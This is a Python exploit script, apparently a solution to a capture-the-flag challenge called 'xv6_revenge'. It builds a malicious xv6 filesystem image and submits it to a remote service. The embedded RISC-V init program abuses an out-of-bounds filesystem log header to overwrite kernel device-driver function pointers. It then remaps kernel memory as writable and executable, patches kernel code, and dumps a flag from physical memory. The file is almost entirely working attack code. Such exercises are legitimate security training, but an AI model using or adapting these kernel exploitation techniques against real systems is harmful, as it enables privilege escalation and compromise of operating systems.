#!/usr/bin/env python3
import argparse
import socket
import struct
import subprocess
import shutil
import sys
import tempfile
from pathlib import Path

BSIZE = 1024
MAGIC = b"XV6IMGv1"
IPB = BSIZE // 64
T_DIR = 1
T_FILE = 2
T_DEVICE = 3
DINODE_FMT = "<hhhhI13I"
DIRENT_FMT = "<H14s"

# Kernel symbols / constants from the supplied kernel.
FETCHADDR = 0x80002756
KVMINITHART = 0x80000EF2
CONSOLEREAD = 0x8000016E
CONSOLEWRITE = 0x800000D0

# kalloc() returns the highest free page first, so the first kernel page-table
# page is deterministic on this challenge.
KERNEL_PGTBL_L2E2 = 0x87FFE010
KERNEL_PGTBL_L2E2_RWX = 0x000000002000000F

FILEWRITE_PATCH = 0x80004230
FILEWRITE_PATCH_QWORD = 0x8A9BA8B597824501
FLAG_PHYS = 0x87FFF000

# log.lh.block[31] aliases devsw[0].read on this exact kernel build.
DEVS_BASE_INDEX = 31


def p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def split64(x: int):
    return [x & 0xFFFFFFFF, (x >> 32) & 0xFFFFFFFF]


INIT_S = rf"""
.option norvc
.section .text
.globl _start
_start:
    # Open the pre-created console device and make fd 0/1/2 all point at it.
    li a7, 15                  # open
    la a0, console
    li a1, 2                   # O_RDWR
    ecall

    li a7, 10                  # dup(0) -> 1
    li a0, 0
    ecall
    li a7, 10                  # dup(0) -> 2
    li a0, 0
    ecall

    li a7, 16                  # write(1, "S0\n", 3)
    li a0, 1
    la a1, msg0
    li a2, 3
    ecall

    # Helper device 8: devsw[8].write = fetchaddr
    li a7, 15
    la a0, awdev
    li a1, 2
    ecall
    mv s1, a0

    # Helper device 9: devsw[9].write = kvminithart
    li a7, 15
    la a0, flushdev
    li a1, 2
    ecall
    mv s2, a0

    # 1) Turn the 1 GiB direct map into an RWX superpage.
    li t0, {KERNEL_PGTBL_L2E2_RWX}
    call put64_at_1
    li a7, 16
    mv a0, s1
    li a1, {KERNEL_PGTBL_L2E2}
    li a2, 8
    ecall

    # 2) Reload satp + flush the kernel TLB on this hart.
    li a7, 16
    mv a0, s2
    li a1, 0
    li a2, 0
    ecall

    li a7, 16                  # write(1, "S1\n", 3)
    li a0, 1
    la a1, msg1
    li a2, 3
    ecall

    # 3) Patch filewrite() so device writes use user_src = 0.
    li t0, {FILEWRITE_PATCH_QWORD}
    call put64_at_1
    li a7, 16
    mv a0, s1
    li a1, {FILEWRITE_PATCH}
    li a2, 8
    ecall

    fence.i

    # 4) Patched filewrite now calls consolewrite(0, FLAG_PHYS, 128).
    li a7, 16
    li a0, 1
    li a1, {FLAG_PHYS}
    li a2, 128
    ecall

hang:
    j hang

# Store t0 little-endian into user virtual addresses 1..8.
put64_at_1:
    li t1, 1
    li t2, 8
1:
    sb t0, 0(t1)
    srli t0, t0, 8
    addi t1, t1, 1
    addi t2, t2, -1
    bnez t2, 1b
    ret

.section .rodata
msg0:     .ascii "S0\n"
msg1:     .ascii "S1\n"
console:  .asciz "console"
awdev:    .asciz "aw"
flushdev: .asciz "fl"
"""

LINKER_LD = r"""
OUTPUT_ARCH(riscv)
ENTRY(_start)
PHDRS
{
  data PT_LOAD FLAGS(6); /* PF_R | PF_W */
  text PT_LOAD FLAGS(5); /* PF_R | PF_X */
}
SECTIONS
{
  . = 0;
  .scratch : {
    BYTE(0);
    . = 0x1000;
  } :data

  . = 0x1000;
  .text : ALIGN(4) {
    *(.text*)
    *(.rodata*)
  } :text
}
"""


def run(cmd, cwd=None):
    print("[*]", " ".join(map(str, cmd)), flush=True)
    subprocess.check_call(cmd, cwd=cwd)


def build_init(out: Path):
    src = out.with_suffix(".S")
    lds = out.with_suffix(".ld")
    src.write_text(INIT_S)
    lds.write_text(LINKER_LD)

    clang = shutil.which("clang")
    if not clang:
        raise SystemExit("clang not found; run this under Linux/WSL with clang + lld installed")

    run(
        [
            clang,
            "--target=riscv64-unknown-elf",
            "-march=rv64gc",
            "-mabi=lp64",
            "-nostdlib",
            "-static",
            "-fuse-ld=lld",
            f"-Wl,-T,{lds}",
            "-Wl,--no-relax",
            str(src),
            "-o",
            str(out),
        ]
    )


def inode_off(inodestart: int, inum: int) -> int:
    blk = inodestart + inum // IPB
    return blk * BSIZE + (inum % IPB) * 64


def write_inode(img: bytearray, inodestart: int, inum: int, itype: int, major: int, minor: int, nlink: int, size: int, addrs=None):
    if addrs is None:
        addrs = [0] * 13
    off = inode_off(inodestart, inum)
    struct.pack_into(DINODE_FMT, img, off, itype, major, minor, nlink, size, *addrs)


def patch_root_devices(fs: Path):
    img = bytearray(fs.read_bytes())
    magic, size, nblocks, ninodes, nlog, logstart, inodestart, bmapstart = struct.unpack_from("<8I", img, BSIZE)
    if magic != 0x10203040:
        raise SystemExit(f"bad xv6 fs magic: {magic:#x}")

    root_off = inode_off(inodestart, 1)
    vals = list(struct.unpack_from(DINODE_FMT, img, root_off))
    root_addrs = list(vals[5:])
    rootblk = root_addrs[0]
    if rootblk == 0:
        raise SystemExit("root directory has no data block")

    entries = [(3, b"console"), (4, b"aw"), (5, b"fl")]
    for idx, (inum, name) in enumerate(entries, start=3):
        ent_off = rootblk * BSIZE + idx * 16
        struct.pack_into(DIRENT_FMT, img, ent_off, inum, name.ljust(14, b"\x00"))
    vals[4] = 6 * 16  # . .. init console aw fl
    struct.pack_into(DINODE_FMT, img, root_off, *vals)

    write_inode(img, inodestart, 3, T_DEVICE, 1, 0, 1, 0)
    write_inode(img, inodestart, 4, T_DEVICE, 8, 0, 1, 0)
    write_inode(img, inodestart, 5, T_DEVICE, 9, 0, 1, 0)

    fs.write_bytes(img)
    print("[*] injected console(1), aw(8), fl(9) device nodes", flush=True)


def patch_log_header(fs: Path):
    data = bytearray(fs.read_bytes())
    magic, size, nblocks, ninodes, nlog, logstart, inodestart, bmapstart = struct.unpack_from("<8I", data, BSIZE)
    if magic != 0x10203040:
        raise SystemExit(f"bad xv6 fs magic: {magic:#x}")
    print(f"[*] superblock: size={size} nlog={nlog} logstart={logstart}", flush=True)

    # base index is 31, and devsw[9].write needs block[69:71], so n must be 71.
    n = 71
    blocks = [0] * n
    for i in range(30):
        blocks[i] = 100 + i

    def put_ptr(major: int, slot: str, ptr: int):
        off = major * 16 + (0 if slot == "read" else 8)
        idx = DEVS_BASE_INDEX + off // 4
        lo, hi = split64(ptr)
        blocks[idx] = lo
        blocks[idx + 1] = hi
        print(f"[*] devsw[{major}].{slot} = {ptr:#x} via block[{idx}:{idx + 2}]", flush=True)

    put_ptr(1, "read", CONSOLEREAD)
    put_ptr(1, "write", CONSOLEWRITE)
    put_ptr(8, "write", FETCHADDR)
    put_ptr(9, "write", KVMINITHART)

    hdr = p32(n) + b"".join(p32(x) for x in blocks)
    off = logstart * BSIZE
    data[off : off + len(hdr)] = hdr
    fs.write_bytes(data)


def build_payload(chall: Path, out: Path):
    mkfs = chall / "mkfs"
    if not mkfs.exists():
        raise SystemExit("first argument must point to the extracted public directory containing mkfs")

    with tempfile.TemporaryDirectory() as t:
        td = Path(t)
        (td / "user").mkdir()
        init = td / "user" / "_init"
        build_init(init)

        fs = td / "fs.img"
        run([str(mkfs), str(fs), "user/_init"], cwd=td)
        patch_root_devices(fs)
        patch_log_header(fs)

        sparse_size = 0x80010000 * BSIZE
        out.write_bytes(MAGIC + struct.pack("<Q", sparse_size) + fs.read_bytes())
        print(f"[+] wrote {out} ({out.stat().st_size} bytes upload, sparse disk {sparse_size} bytes)", flush=True)


def recv_all(sock: socket.socket) -> bytes:
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def send_payload(host: str, port: int, payload: bytes):
    with socket.create_connection((host, port), timeout=10) as sock:
        sock.settimeout(12)
        banner = sock.recv(4096)
        if banner:
            sys.stdout.buffer.write(banner)
            sys.stdout.flush()
        sock.sendall(str(len(payload)).encode() + b"\n")
        sock.sendall(payload)
        rest = recv_all(sock)
        if rest:
            sys.stdout.buffer.write(rest)
            sys.stdout.flush()


def main():
    parser = argparse.ArgumentParser(description="Build and optionally send the xv6_revenge exploit payload")
    parser.add_argument("public_dir", help="path to the extracted public directory")
    parser.add_argument("--output", default="payload.bin", help="where to save the wrapped payload")
    parser.add_argument("--host", help="remote host to attack")
    parser.add_argument("--port", type=int, help="remote port to attack")
    args = parser.parse_args()

    chall = Path(args.public_dir).resolve()
    out = Path(args.output).resolve()
    build_payload(chall, out)

    if args.host or args.port:
        if not (args.host and args.port):
            raise SystemExit("--host and --port must be provided together")
        print(f"[*] sending to {args.host}:{args.port}", flush=True)
        send_payload(args.host, args.port, out.read_bytes())


if __name__ == "__main__":
    main()
